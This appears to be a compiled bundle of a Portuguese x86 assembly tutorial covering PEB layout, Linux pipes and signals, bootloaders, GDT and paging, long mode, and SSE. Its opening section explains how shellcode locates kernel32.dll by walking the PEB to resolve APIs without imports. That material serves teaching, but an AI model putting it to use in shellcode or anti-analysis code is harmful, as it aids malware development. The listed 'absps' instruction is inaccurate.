; [PEB+0x10] = Ldr (loader data)
; [PEB+0x60] = OSMajorVersion
; [PEB+0x64] = OSMinorVersion
; [PEB+0x2A0] = Heap

; Técnica de carregamento de API sem imports (shellcode):
; 1. Ler GS para obter TEB
; 2. TEB+0x60 = PEB
; 3. PEB+0x18 = Ldr
; 4. Ldr+0x20 = InMemoryOrderModuleList
; 5. Iterar DLLs carregadas (ntdll, kernel32...)
; 6. Parsear export table da DLL
; 7. Resolver GetProcAddress, LoadLibrary, etc.`}),r.jsx(d,{language:"nasm",filename:"find_kernel32.asm",code:`; Técnica para encontrar kernel32.dll sem import table
; Usada em shellcode e técnicas anti-análise

find_kernel32:
    ; Via PEB:
    mov rax, [gs:0x60]          ; rax = PEB

    ; PEB->Ldr->InMemoryOrderModuleList
    mov rax, [rax + 0x18]       ; Ldr
    mov rax, [rax + 0x20]       ; InMemoryOrderModuleList.Flink

    ; O primeiro módulo é o executável, segundo é ntdll, terceiro é kernel32
    mov rax, [rax]              ; avança: Flink
    mov rax, [rax]              ; avança novamente
    mov rax, [rax + 0x20]       ; DllBase = ponteiro para kernel32.dll
    ret`})]})}function s1(){return r.jsxs(L,{title:"I/O e Processos",subtitle:"Pipes, sinais, file descriptors e controle de processos em Assembly",difficulty:"avancado",timeToRead:"15 min",children:[r.jsx("p",{children:"Assembly permite controle completo sobre I/O e processos através das system calls do Linux. Entender file descriptors, pipes e sinais é essencial para programação de sistemas."}),r.jsx("h2",{children:"File Descriptors"}),r.jsx(d,{language:"bash",code:`# File descriptors padrão (sempre disponíveis):
# 0 = stdin  (entrada padrão)
# 1 = stdout (saída padrão)
# 2 = stderr (saída de erro)`}),r.jsx(d,{language:"nasm",filename:"fd_basico.asm",code:`; Escrever na stderr:
    mov rax, 1          ; sys_write
    mov rdi, 2          ; fd = STDERR
    lea rsi, [msg_erro]
    mov rdx, msg_len
    syscall

; Duplicar fd (dup2):
    ; Redirecionar stdout para um arquivo:
    mov rax, 2          ; sys_open
    lea rdi, [filename]
    mov rsi, 0x241      ; O_WRONLY | O_CREAT | O_TRUNC
    mov rdx, 0o644
    syscall
    mov rbx, rax        ; rbx = file_fd

    ; dup2(file_fd, STDOUT=1) — substitui stdout pelo arquivo
    mov rax, 33         ; sys_dup2
    mov rdi, rbx        ; oldfd = file_fd
    mov rsi, 1          ; newfd = stdout
    syscall`}),r.jsx("h2",{children:"Pipes — Comunicação entre Processos"}),r.jsx(d,{language:"nasm",filename:"pipe.asm",code:`section .bss
    pipe_fds resq 2     ; [0]=read_end, [1]=write_end

section .data
    mensagem db "Dados via pipe!", 10

section .text
_start:
    ; Criar pipe:
    mov rax, 22         ; sys_pipe
    lea rdi, [pipe_fds]
    syscall

    ; Fork:
    mov rax, 57         ; sys_fork
    syscall

    test rax, rax
    jz  .filho
    jns .pai
    ; erro no fork
    jmp .fim

.filho:
    ; Fechar o lado de leitura do pipe
    mov rax, 3          ; sys_close
    mov rdi, [pipe_fds + 0]     ; read_end
    syscall

    ; Escrever no pipe
    mov rax, 1          ; sys_write
    mov rdi, [pipe_fds + 8]     ; write_end
    lea rsi, [mensagem]
    mov rdx, 16
    syscall

    ; Fechar write_end e sair
    mov rax, 3
    mov rdi, [pipe_fds + 8]
    syscall
    mov rax, 60
    xor rdi, rdi
    syscall

.pai:
    ; Fechar o lado de escrita do pipe
    mov rax, 3
    mov rdi, [pipe_fds + 8]     ; write_end
    syscall

    ; Ler do pipe:
    mov rax, 0          ; sys_read
    mov rdi, [pipe_fds + 0]     ; read_end
    lea rsi, [buffer]
    mov rdx, 64
    syscall
    ; rax = bytes lidos, buffer contém os dados

    ; Fechar read_end e esperar filho:
    mov rax, 3
    mov rdi, [pipe_fds + 0]
    syscall

    ; wait4(-1, NULL, 0, NULL)
    mov rax, 61
    mov rdi, -1
    xor rsi, rsi
    xor rdx, rdx
    xor r10, r10
    syscall

.fim:
    mov rax, 60
    xor rdi, rdi
    syscall`}),r.jsx("h2",{children:"Sinais (Signals)"}),r.jsx(d,{language:"bash",code:`# Sinais importantes:
# SIGHUP  (1)  — terminal fechado
# SIGINT  (2)  — Ctrl+C
# SIGKILL (9)  — morte imediata (não pode ser ignorado)
# SIGSEGV (11) — segmentation fault
# SIGTERM (15) — terminação graciosa
# SIGCHLD (17) — filho terminou`}),r.jsx(d,{language:"nasm",filename:"signals.asm",code:`; Enviar sinal para processo:
    ; kill(pid, SIGTERM)
    mov rax, 62         ; sys_kill
    mov rdi, pid        ; PID alvo
    mov rsi, 15         ; SIGTERM
    syscall

; Ignorar SIGINT (Ctrl+C):
    ; sigaction(SIGINT, &act, NULL)
    ; Estrutura sigaction apontando para SIG_IGN (1):
    mov rax, 13         ; sys_rt_sigaction
    mov rdi, 2          ; SIGINT
    lea rsi, [sigaction_struct]  ; nova ação: SIG_IGN
    xor rdx, rdx        ; NULL (não salvar ação anterior)
    mov r10, 8          ; sizeof(sigset_t)
    syscall`}),r.jsx("h2",{children:"Leitura de /proc"}),r.jsx(d,{language:"nasm",filename:"proc.asm",code:`; Ler /proc/self/maps (mapa de memória do processo):
section .data
    maps_path db "/proc/self/maps", 0
    newline   db 10, 0

section .bss
    buf resb 4096

section .text
    ; Abrir /proc/self/maps:
    mov rax, 2          ; sys_open
    lea rdi, [maps_path]
    xor rsi, rsi        ; O_RDONLY = 0
    xor rdx, rdx
    syscall
    mov rbx, rax        ; rbx = fd

    ; Ler e imprimir:
.read_loop:
    mov rax, 0          ; sys_read
    mov rdi, rbx        ; fd
    lea rsi, [buf]
    mov rdx, 4096
    syscall
    test rax, rax
    jle .done

    ; Escrever no stdout:
    mov rdx, rax        ; bytes lidos
    mov rax, 1          ; sys_write
    mov rdi, 1          ; stdout
    lea rsi, [buf]
    syscall
    jmp .read_loop
.done:
    mov rax, 3
    mov rdi, rbx
    syscall`})]})}function o1(){return r.jsxs(L,{title:"Modo Real (16-bit)",subtitle:"O modo em que o processador inicia — BIOS, DOS e bootloaders",difficulty:"avancado",timeToRead:"15 min",children:[r.jsxs("p",{children:["Quando um computador liga, o processador começa em ",r.jsx("strong",{children:"Modo Real"})," — um modo de 16 bits compatível com o Intel 8086 de 1978. O BIOS roda nesse modo. Bootloaders começam aqui antes de transicionar para modo protegido ou long mode."]}),r.jsx("h2",{children:"Características do Modo Real"}),r.jsxs("ul",{children:[r.jsx("li",{children:"Registradores de 16 bits: AX, BX, CX, DX, SI, DI, SP, BP"}),r.jsx("li",{children:"Segmentos de 16 bits: CS, DS, ES, SS"}),r.jsx("li",{children:"Endereçamento: Physical = Segment × 16 + Offset"}),r.jsx("li",{children:"Máximo de 1MB de RAM acessível"}),r.jsx("li",{children:"Sem proteção de memória — qualquer código pode ler/escrever qualquer lugar"}),r.jsx("li",{children:"Interrupções BIOS disponíveis (INT 10h, INT 13h, INT 16h...)"})]}),r.jsx("h2",{children:"Cálculo de Endereço no Modo Real"}),r.jsx(d,{language:"bash",code:`# Endereço físico = Segmento × 16 + Offset
# Exemplo: CS = 0x07C0, IP = 0x0000
# Endereço físico = 0x07C0 × 16 + 0x0000 = 0x7C00

# Por que 0x7C00? O BIOS carrega o MBR (512 bytes do primeiro setor do disco)
# sempre para o endereço físico 0x7C00 e pula para lá.`}),r.jsx("h2",{children:"Hello World com BIOS"}),r.jsx(d,{language:"nasm",filename:"hello_bios.asm",code:`; hello_bios.asm — 16-bit real mode
; Compilar: nasm -f bin hello_bios.asm -o hello.bin
; Testar: qemu-system-i386 -fda hello.bin

bits 16               ; diz ao NASM: gerar código de 16-bit
org 0x7C00            ; o BIOS nos carrega em 0x7C00

start:
    ; Configurar segmentos
    xor ax, ax
    mov ds, ax
    mov es, ax
    mov ss, ax
    mov sp, 0x7C00    ; stack cresce abaixo do nosso código

    ; Exibir string com BIOS INT 10h (modo teletype)
    mov si, mensagem
.loop:
    lodsb             ; al = [si++]
    test al, al       ; null terminator?
    jz  .halt
    mov ah, 0x0E      ; BIOS função: print character
    int 0x10          ; BIOS interrupt
    jmp .loop

.halt:
    cli               ; desabilitar interrupções
    hlt               ; parar o processador

mensagem db "Hello, Real Mode!", 13, 10, 0

; Magic number obrigatório no final do setor de boot:
times 510 - ($ - $$) db 0    ; preencher com zeros até byte 510
dw 0xAA55                     ; assinatura de boot (bytes 511-512)`}),r.jsx("h2",{children:"Interrupções BIOS"}),r.jsxs("table",{children:[r.jsx("thead",{children:r.jsxs("tr",{children:[r.jsx("th",{children:"INT"}),r.jsx("th",{children:"Função"}),r.jsx("th",{children:"Uso"})]})}),r.jsx("tbody",{children:[["INT 10h","Video services","imprimir texto, mudar modo de vídeo"],["INT 13h","Disk services","ler/escrever setores do disco"],["INT 16h","Keyboard services","ler tecla pressionada"],["INT 15h","System services","detectar memória disponível"],["INT 12h","Memory size","retorna KB de RAM"]].map(([i,l,u])=>r.jsxs("tr",{children:[r.jsx("td",{children:r.jsx("code",{children:i})}),r.jsx("td",{children:l}),r.jsx("td",{children:u})]},i))})]}),r.jsx("h2",{children:"Ler Setor do Disco"}),r.jsx(d,{language:"nasm",filename:"read_disk.asm",code:`; INT 13h, AH=02 — Ler setores do disco
; AH = 02 (função de leitura)
; AL = número de setores a ler
; CH = número da trilha (0-79)
; CL = número do setor (1-18)
; DH = número da cabeça (0-1)
; DL = número da unidade (0=A:, 0x80=C:)
; ES:BX = buffer de destino

read_sector:
    mov ah, 0x02          ; ler setor
    mov al, 1             ; 1 setor (512 bytes)
    mov ch, 0             ; trilha 0
    mov cl, 2             ; setor 2 (o 1 é o bootloader)
    mov dh, 0             ; cabeça 0
    mov dl, 0             ; unidade A: (floppy)
    mov bx, 0x8000        ; ES:BX = 0x0000:0x8000 = destino
    int 0x13
    jc .erro              ; CF=1 se erro
    ; código carregado em 0x8000
    jmp 0x0000:0x8000     ; pular para o código carregado
.erro:
    ; tratamento de erro`}),r.jsx(T,{type:"info",title:"UEFI vs BIOS",children:'Computadores modernos usam UEFI (Unified Extensible Firmware Interface) em vez do BIOS legado. UEFI inicia em modo protegido (ou long mode) diretamente, mas mantém compatibilidade com o boot legado de 16-bit via "CSM" (Compatibility Support Module).'})]})}function i1(){return r.jsxs(L,{title:"Modo Protegido (32-bit)",subtitle:"Proteção de memória, GDT, segmentação e a base do kernel moderno",difficulty:"expert",timeToRead:"20 min",children:[r.jsxs("p",{children:["O ",r.jsx("strong",{children:"Modo Protegido"})," foi introduzido no Intel 80286 (1982) e expandido no 80386 (1985). É o modo que tornou possível multitarefa real, proteção de memória e anéis de privilégio — a base dos sistemas operacionais modernos."]}),r.jsx("h2",{children:"Diferenças do Modo Real"}),r.jsxs("ul",{children:[r.jsxs("li",{children:[r.jsx("strong",{children:"Registradores de 32-bit:"})," EAX, EBX, ECX, EDX, ESI, EDI, ESP, EBP"]}),r.jsxs("li",{children:[r.jsx("strong",{children:"Proteção de memória:"})," cada segmento tem base, limite e flags de acesso"]}),r.jsxs("li",{children:[r.jsx("strong",{children:"Anéis de privilégio:"})," Ring 0 (kernel) a Ring 3 (usuário)"]}),r.jsxs("li",{children:[r.jsx("strong",{children:"Endereçamento virtual:"})," até 4GB de memória virtual por processo"]}),r.jsxs("li",{children:[r.jsx("strong",{children:"Paginação:"})," virtual → físico com MMU"]}),r.jsxs("li",{children:[r.jsx("strong",{children:"GDT/LDT:"})," Global e Local Descriptor Tables definem segmentos"]})]}),r.jsx("h2",{children:"Estrutura da GDT (Global Descriptor Table)"}),r.jsx(d,{language:"bash",code:`; Cada entry da GDT tem 8 bytes (64 bits):
; Bits 15-0:  Limit 0-15
; Bits 31-16: Base 0-15
; Bits 39-32: Base 16-23
; Bits 43-40: Type (código/dados, leitura, escrita, direção...)
; Bit  44:    S (descriptor type: 0=sistema, 1=código/dados)
; Bits 46-45: DPL (privilege level: 0=kernel, 3=user)
; Bit  47:    P (present: 1=segmento válido)
; Bits 51-48: Limit 16-19
; Bit  52:    AVL (disponível para OS)
; Bit  53:    L (64-bit code segment)
; Bit  54:    D/B (default op size: 0=16-bit, 1=32-bit)
; Bit  55:    G (granularity: 0=bytes, 1=pages)
; Bits 63-56: Base 24-31`}),r.jsx(d,{language:"nasm",filename:"gdt.asm",code:`; GDT mínima para modo protegido 32-bit:
gdt_start:
    ; Null descriptor (obrigatório — índice 0)
    dq 0

    ; Code segment (Ring 0)
    ; Base=0, Limit=0xFFFFF (4GB), Code, Read, Ring0, 32-bit
    dw 0xFFFF       ; Limit 0-15
    dw 0x0000       ; Base 0-15
    db 0x00         ; Base 16-23
    db 0b10011010   ; P=1, DPL=00, S=1, Type=1010 (code, read)
    db 0b11001111   ; G=1, D=1, L=0, AVL=0, Limit 16-19=1111
    db 0x00         ; Base 24-31

    ; Data segment (Ring 0)
    dw 0xFFFF
    dw 0x0000
    db 0x00
    db 0b10010010   ; P=1, DPL=00, S=1, Type=0010 (data, write)
    db 0b11001111
    db 0x00

gdt_end:

gdt_descriptor:
    dw gdt_end - gdt_start - 1  ; tamanho - 1
    dd gdt_start                ; endereço linear da GDT

CODE_SEG equ 0x08   ; 1º segment (8 bytes após null = índice 1)
DATA_SEG equ 0x10   ; 2º segment (16 bytes após null = índice 2)`}),r.jsx("h2",{children:"Transição para Modo Protegido"}),r.jsx(d,{language:"nasm",filename:"modo_protegido.asm",code:`bits 16
org 0x7C00

start_real_mode:
    cli                         ; desabilitar interrupções
    
    ; 1. Carregar a GDT
    lgdt [gdt_descriptor]
    
    ; 2. Habilitar modo protegido (setar bit PE do CR0)
    mov eax, cr0
    or  eax, 1                  ; setar bit PE
    mov cr0, eax
    
    ; 3. Far jump para limpar o pipeline e atualizar CS
    jmp CODE_SEG:protected_mode_start

bits 32
protected_mode_start:
    ; Agora estamos em modo protegido 32-bit!
    
    ; 4. Configurar segmentos de dados
    mov ax, DATA_SEG
    mov ds, ax
    mov es, ax
    mov fs, ax
    mov gs, ax
    mov ss, ax
    mov esp, 0x90000            ; nova stack
    
    ; 5. Habilitar interrupções (depois de configurar IDT!)
    ; sti  ← não agora, aguardar IDT
    
    ; Código do kernel 32-bit começa aqui
    call kernel_main`}),r.jsx("h2",{children:"Paginação em Modo Protegido"}),r.jsx(d,{language:"nasm",filename:"paginacao.asm",code:`; Configurar paginação (Identity Mapping — virtual = físico):
setup_paging:
    ; Criar Page Directory (4KB alinhado)
    mov edi, 0x1000         ; Page Directory em 0x1000
    mov cr3, edi            ; CR3 = endereço do Page Directory
    xor eax, eax
    mov ecx, 4096           ; limpar 4KB
    rep stosd

    ; Criar Page Table para primeiros 4MB:
    mov edi, 0x2000         ; Page Table em 0x2000
    mov eax, 0x00000003     ; endereço 0x0, present+writable
    mov ecx, 1024           ; 1024 entradas (4MB)
.fill_pt:
    stosd
    add eax, 0x1000         ; próxima página (4KB)
    loop .fill_pt

    ; Apontar Page Directory para Page Table:
    mov dword [0x1000], 0x00002003   ; PT em 0x2000, present+writable

    ; Habilitar paginação (bit PG do CR0):
    mov eax, cr0
    or  eax, 0x80000000     ; setar bit PG
    mov cr0, eax
    ret`}),r.jsx(T,{type:"info",title:"Ring 0 vs Ring 3",children:"Ring 0 é o kernel — pode executar qualquer instrução e acessar qualquer memória. Ring 3 são os processos de usuário — acesso a memória restrito, instruções privilegiadas proibidas. Uma violação de acesso em Ring 3 causa uma General Protection Fault (#GP), que o kernel trata enviando SIGSEGV ao processo."})]})}function n1(){return r.jsxs(L,{title:"Long Mode (64-bit)",subtitle:"A transição para 64 bits — IA-32e, paginação de 4 níveis e AMD64",difficulty:"expert",timeToRead:"15 min",children:[r.jsxs("p",{children:[r.jsx("strong",{children:"Long Mode"})," (também chamado de IA-32e ou AMD64 mode) é o modo de 64 bits introduzido pela AMD em 2003. É o modo padrão de execução em sistemas Linux e Windows x86-64 modernos."]}),r.jsx("h2",{children:"Características do Long Mode"}),r.jsxs("ul",{children:[r.jsxs("li",{children:[r.jsx("strong",{children:"Registradores de 64 bits:"})," RAX, RBX, ... (prefixo R)"]}),r.jsxs("li",{children:[r.jsx("strong",{children:"16 registradores gerais:"})," RAX-R15"]}),r.jsxs("li",{children:[r.jsx("strong",{children:"Espaço de endereçamento:"}),' 2^64 bytes teórico, 2^48 bytes "canonical" na prática']}),r.jsxs("li",{children:[r.jsx("strong",{children:"Paginação obrigatória de 4 níveis:"})," PML4 → PDPT → PD → PT"]}),r.jsxs("li",{children:[r.jsx("strong",{children:"Segmentação obsoleta:"})," CS, DS, SS, ES base e limite são ignorados (só FS e GS ainda têm base)"]}),r.jsxs("li",{children:[r.jsx("strong",{children:"New instructions:"})," SYSCALL/SYSRET (mais eficiente que int 0x80)"]}),r.jsxs("li",{children:[r.jsx("strong",{children:"RIP-relative addressing:"})," LEA/MOV podem referenciar memória relativa ao RIP"]})]}),r.jsx("h2",{children:"Paginação de 4 Níveis"}),r.jsx(d,{language:"bash",code:`; Endereço virtual de 48 bits é decomposto em:
; [63:48] — bits de sinal estendido (todos 0 ou todos 1 = "canonical")
; [47:39] — PML4 index (9 bits, 512 entradas)
; [38:30] — PDPT index (9 bits, 512 entradas)
; [29:21] — PD index (9 bits, 512 entradas)
; [20:12] — PT index (9 bits, 512 entradas)
; [11:0]  — offset dentro da página (12 bits, 4KB)

; Exemplo: endereço 0x00007fff5fbff800
; Binário:  0000 0000 0000 0000 0111 1111 1111 1111 0101 1111 1011 1111 1111 1000 0000 0000
; PML4 idx: 0b000000000 = 0
; PDPT idx: 0b011111111 = 255
; PD idx:   0b101111111 = 383
; PT idx:   0b011111111 = 255
; Offset:   0b100000000000 = 2048`}),r.jsx("h2",{children:"Estrutura de Entrada de Página (PTE)"}),r.jsx(d,{language:"bash",code:`; Formato de cada entrada de nível na hierarquia de paginação (8 bytes):
; Bit 0: Present (P) — entrada válida?
; Bit 1: Read/Write (R/W) — 0=somente leitura, 1=leitura+escrita
; Bit 2: User/Supervisor (U/S) — 0=kernel only, 1=acessível por user
; Bit 3: Page Write Through (PWT)
; Bit 4: Page Cache Disable (PCD)
; Bit 5: Accessed (A) — setado quando acessado
; Bit 6: Dirty (D) — setado quando escrito (só em PT)
; Bit 7: Page Size (PS) — 1=página grande (2MB/1GB) se no PD/PDPT
; Bits 11-8: Available for OS use
; Bits 51-12: Physical Frame Number (endereço físico da próxima tabela/frame)
; Bits 62-52: Available for OS use
; Bit 63: Execute Disable (NX/XD) — 1=não pode executar código desta página`}),r.jsx("h2",{children:"Habilitando Long Mode"}),r.jsx(d,{language:"nasm",filename:"long_mode.asm",code:`bits 32
; Estamos em modo protegido 32-bit
; Precisamos:
; 1. Verificar se CPU suporta long mode (CPUID)
; 2. Configurar paginação de 4 níveis
; 3. Habilitar PAE (Physical Address Extension)
; 4. Setar bit LME no EFER MSR
; 5. Habilitar paginação (bit PG do CR0)
; 6. Far jump com novo GDT de 64-bit

enable_long_mode:
    ; Verificar suporte (CPUID)
    mov eax, 0x80000001
    cpuid
    bt  edx, 29             ; bit 29 = suporte a long mode
    jnc .no_long_mode       ; se não suporta, erro

    ; Configurar PML4 (Level 4 Page Table)
    mov edi, 0x1000         ; PML4 em 0x1000
    mov cr3, edi
    xor eax, eax
    mov ecx, 4096 / 4
    rep stosd

    ; PML4[0] → PDPT em 0x2000
    mov dword [0x1000], 0x00002003  ; present + writable
    
    ; PDPT[0] → PD em 0x3000
    mov dword [0x2000], 0x00003003
    
    ; PD[0] → PT em 0x4000
    mov dword [0x3000], 0x00004003
    
    ; PT[0..511] = identity map primeiro 2MB
    mov edi, 0x4000
    mov eax, 0x00000003     ; frame 0, present + writable
    mov ecx, 512
.fill_pt:
    mov [edi], eax
    add eax, 0x1000
    add edi, 8
    loop .fill_pt

    ; Habilitar PAE (bit 5 do CR4)
    mov eax, cr4
    or  eax, (1 << 5)       ; PAE
    or  eax, (1 << 7)       ; PGE (Page Global Enable)
    mov cr4, eax

    ; Setar Long Mode Enable no EFER MSR
    mov ecx, 0xC0000080     ; EFER MSR
    rdmsr
    or  eax, (1 << 8)       ; LME = Long Mode Enable
    wrmsr

    ; Habilitar paginação → ativa Long Mode!
    mov eax, cr0
    or  eax, (1 << 31) | (1 << 0)  ; PG | PE
    mov cr0, eax

    ; Far jump para código 64-bit com novo CS
    jmp 0x0008:long_mode_start  ; 0x0008 = code segment da GDT de 64-bit

.no_long_mode:
    ; Procesador não suporta 64-bit
    hlt

bits 64
long_mode_start:
    ; Agora estamos em Long Mode 64-bit!
    mov rax, 0x2F742F204F4B21  ; "OK! t/"
    ; ... inicializar kernel 64-bit ...`}),r.jsx(T,{type:"info",title:"Canonical Addresses",children:'Em Long Mode, endereços virtuais válidos ("canonical") devem ter os bits 63:48 todos iguais ao bit 47. Endereços de usuário ficam em 0x0000..0x00007FFF..., endereços de kernel ficam em 0xFFFF8000..0xFFFFFFFF.... O "buraco" entre eles causa #GP se acessado.'})]})}function l1(){return r.jsxs(L,{title:"Introdução a SIMD/SSE",subtitle:"Single Instruction, Multiple Data — processamento paralelo no processador",difficulty:"avancado",timeToRead:"18 min",children:[r.jsxs("p",{children:[r.jsx("strong",{children:"SIMD"})," (Single Instruction, Multiple Data) é uma extensão do modelo convencional onde uma instrução opera em múltiplos dados simultaneamente. Em x86-64, as extensões SIMD são SSE, SSE2-4, AVX e AVX-512."]}),r.jsx("h2",{children:"Por que SIMD?"}),r.jsxs("ul",{children:[r.jsx("li",{children:"Um loop que soma arrays de 1000 floats leva 1000 ciclos sem SIMD"}),r.jsx("li",{children:"Com SSE (128-bit / 4 floats por operação): ~250 ciclos"}),r.jsx("li",{children:"Com AVX (256-bit / 8 floats por operação): ~125 ciclos"}),r.jsx("li",{children:"Com AVX-512 (512-bit / 16 floats por operação): ~63 ciclos"}),r.jsx("li",{children:"Ganho de até 16× para operações com floats!"})]}),r.jsx("h2",{children:"Registradores SIMD"}),r.jsxs("table",{children:[r.jsx("thead",{children:r.jsxs("tr",{children:[r.jsx("th",{children:"Extensão"}),r.jsx("th",{children:"Registradores"}),r.jsx("th",{children:"Tamanho"}),r.jsx("th",{children:"Capacidade"})]})}),r.jsxs("tbody",{children:[r.jsxs("tr",{children:[r.jsx("td",{children:"SSE"}),r.jsx("td",{children:"XMM0-XMM15"}),r.jsx("td",{children:"128-bit"}),r.jsx("td",{children:"4×float ou 2×double ou 16×byte"})]}),r.jsxs("tr",{children:[r.jsx("td",{children:"AVX"}),r.jsx("td",{children:"YMM0-YMM15"}),r.jsx("td",{children:"256-bit"}),r.jsx("td",{children:"8×float ou 4×double ou 32×byte"})]}),r.jsxs("tr",{children:[r.jsx("td",{children:"AVX-512"}),r.jsx("td",{children:"ZMM0-ZMM31"}),r.jsx("td",{children:"512-bit"}),r.jsx("td",{children:"16×float ou 8×double ou 64×byte"})]})]})]}),r.jsx(T,{type:"info",title:"Relação entre XMM/YMM/ZMM",children:"XMM0 são os bits 0-127 de YMM0, que são os bits 0-255 de ZMM0. Escrever em XMM0 (SSE) zera os bits superiores de YMM0/ZMM0. Escrever em YMM0 (AVX) zera os bits superiores de ZMM0."}),r.jsx("h2",{children:"Verificar Suporte a SSE/AVX"}),r.jsx(d,{language:"nasm",filename:"check_simd.asm",code:`; CPUID para verificar suporte a SSE/AVX:
    mov eax, 1
    cpuid
    ; ECX e EDX contêm as feature flags

    ; SSE:  EDX bit 25
    bt  edx, 25
    jnc .no_sse

    ; SSE2: EDX bit 26
    bt  edx, 26
    jnc .no_sse2

    ; SSE3: ECX bit 0
    bt  ecx, 0
    jnc .no_sse3

    ; SSE4.1: ECX bit 19
    bt  ecx, 19
    jnc .no_sse41

    ; AVX: ECX bit 28
    bt  ecx, 28
    jnc .no_avx

    ; AVX-512: CPUID leaf 7, EBX bit 16
    mov eax, 7
    xor ecx, ecx
    cpuid
    bt  ebx, 16
    jnc .no_avx512`}),r.jsx("h2",{children:"Primeiro Programa SSE"}),r.jsx(d,{language:"nasm",filename:"sse_hello.asm",code:`; Somar 4 floats com SSE em vez de 4 operações separadas
section .data
    align 16               ; IMPORTANTE: dados SSE DEVEM ser alinhados a 16 bytes!
    a dd 1.0, 2.0, 3.0, 4.0    ; 4 floats
    b dd 5.0, 6.0, 7.0, 8.0    ; 4 floats
    
section .bss
    align 16
    result resd 4               ; resultado

section .text
_start:
    ; Carregar 4 floats de 'a' em XMM0:
    movaps xmm0, [a]           ; MOVAPS = move aligned packed single

    ; Carregar 4 floats de 'b' em XMM1:
    movaps xmm1, [b]

    ; Somar os 4 pares simultaneamente:
    addps  xmm0, xmm1          ; ADDPS = add packed single
    ; xmm0 agora contém: [1+5, 2+6, 3+7, 4+8] = [6, 8, 10, 12]

    ; Salvar resultado:
    movaps [result], xmm0

    ; Equivalente sem SIMD (4× mais lento!):
    ; movss xmm0, [a]
    ; addss xmm0, [b]
    ; movss [result], xmm0
    ; movss xmm0, [a+4]
    ; addss xmm0, [b+4]
    ; ... e assim por diante para cada par

    mov rax, 60
    xor rdi, rdi
    syscall`}),r.jsx("h2",{children:"Sufixos de Instrução SIMD"}),r.jsxs("table",{children:[r.jsx("thead",{children:r.jsxs("tr",{children:[r.jsx("th",{children:"Sufixo"}),r.jsx("th",{children:"Significado"}),r.jsx("th",{children:"Exemplo"})]})}),r.jsx("tbody",{children:[["ss","Scalar Single (1 float)","addss xmm0, xmm1"],["sd","Scalar Double (1 double)","addsd xmm0, xmm1"],["ps","Packed Single (4 floats)","addps xmm0, xmm1"],["pd","Packed Double (2 doubles)","addpd xmm0, xmm1"],["pi","Packed Integer","paddb xmm0, xmm1"],["si","Scalar Integer",""]].map(([i,l,u])=>r.jsxs("tr",{children:[r.jsx("td",{children:r.jsx("code",{children:i})}),r.jsx("td",{children:l}),r.jsx("td",{children:r.jsx("code",{children:u})})]},i))})]}),r.jsx("h2",{children:"Prefixo MOV para SIMD"}),r.jsx(d,{language:"nasm",filename:"mov_simd.asm",code:`; Carregamento alinhado (16-byte aligned) — mais rápido, causa #GP se não alinhado:
movaps xmm0, [addr]     ; Move Aligned Packed Single
movapd xmm0, [addr]     ; Move Aligned Packed Double
movdqa xmm0, [addr]     ; Move Double Quadword Aligned

; Carregamento não alinhado — mais lento, mas aceita qualquer endereço:
movups xmm0, [addr]     ; Move Unaligned Packed Single
movupd xmm0, [addr]     ; Move Unaligned Packed Double
movdqu xmm0, [addr]     ; Move Double Quadword Unaligned

; Scalar (apenas o valor baixo, não afeta outros):
movss  xmm0, [addr]     ; carrega 1 float (bits 0-31 de XMM0)
movsd  xmm0, [addr]     ; carrega 1 double (bits 0-63 de XMM0)`}),r.jsx("h2",{children:"Loop Vetorizado com SSE"}),r.jsx(d,{language:"nasm",filename:"loop_vetorizado.asm",code:`; C equivalente:
; void scale(float *arr, float scalar, int n) {
;   for (int i = 0; i < n; i++) arr[i] *= scalar;
; }
; Argumentos: rdi=arr, xmm0=scalar, rsi=n (múltiplo de 4)

scale_sse:
    ; Broadcast scalar para todos os 4 elementos de XMM1:
    shufps xmm0, xmm0, 0    ; xmm0 = [s, s, s, s]

    ; n em rsi, assumindo múltiplo de 4
    shr rsi, 2              ; rsi = n / 4 (número de iterações)
.loop:
    movaps xmm2, [rdi]      ; carrega 4 floats
    mulps  xmm2, xmm0       ; multiplica 4 × scalar
    movaps [rdi], xmm2      ; salva 4 floats
    add rdi, 16             ; avança 16 bytes (4 floats)
    dec rsi
    jnz .loop
    ret`})]})}function c1(){return r.jsxs(L,{title:"Instruções SSE e SSE2-4",subtitle:"O conjunto completo de instruções SIMD de 128 bits",difficulty:"avancado",timeToRead:"20 min",children:[r.jsx("p",{children:"SSE (Streaming SIMD Extensions) é o conjunto de instruções de 128 bits introduzido no Pentium III (1999). SSE2 adicionou operações com doubles e inteiros. SSE3/SSSE3/SSE4.1/SSE4.2 adicionaram mais instruções especializadas."}),r.jsx("h2",{children:"Operações Aritméticas SSE"}),r.jsx(d,{language:"nasm",filename:"sse_arith.asm",code:`; === FLOAT (ps = packed single, 4 floats por XMM) ===
addps   xmm0, xmm1    ; xmm0[i] += xmm1[i] para i=0..3
subps   xmm0, xmm1    ; subtração
mulps   xmm0, xmm1    ; multiplicação
divps   xmm0, xmm1    ; divisão (mais lenta!)
sqrtps  xmm0, xmm1    ; raiz quadrada de cada elemento
rcpps   xmm0, xmm1    ; recíproco aproximado (rápido mas inexato)
rsqrtps xmm0, xmm1    ; recíproco de raiz quadrada (aproximado)
minps   xmm0, xmm1    ; mínimo elemento a elemento
maxps   xmm0, xmm1    ; máximo elemento a elemento
absps   xmm0, xmm1    ; valor absoluto (via andps com máscara)

; === DOUBLE (pd = packed double, 2 doubles por XMM) ===
addpd   xmm0, xmm1    ; xmm0[i] += xmm1[i] para i=0..1
mulpd   xmm0, xmm1    ; multiplicação
sqrtpd  xmm0, xmm1    ; raiz quadrada

; === SCALAR (ss = scalar single, apenas elemento 0) ===
addss   xmm0, xmm1    ; xmm0[0] += xmm1[0] (outros inalterados)
mulss   xmm0, xmm1
sqrtss  xmm0, xmm1`}),r.jsx("h2",{children:"Comparações SIMD"}),r.jsx(d,{language:"nasm",filename:"sse_cmp.asm",code:`; Comparações retornam máscara de bits (0x00000000 = falso, 0xFFFFFFFF = verdadeiro)
cmpps xmm0, xmm1, 0   ; EQ  — igual
cmpps xmm0, xmm1, 1   ; LT  — menor que
cmpps xmm0, xmm1, 2   ; LE  — menor ou igual
cmpps xmm0, xmm1, 4   ; NEQ — diferente
cmpps xmm0, xmm1, 5   ; NLT — não menor que
cmpps xmm0, xmm1, 6   ; NLE — não menor ou igual

; Alternativa com mnemonics mais legíveis:
cmpeqps  xmm0, xmm1   ; iguais
cmpltps  xmm0, xmm1   ; menor que
cmpnltps xmm0, xmm1   ; não menor que

; Usar máscara para seleção condicional:
; if (a > 0) result = a; else result = 0;
xorps xmm2, xmm2       ; xmm2 = 0.0
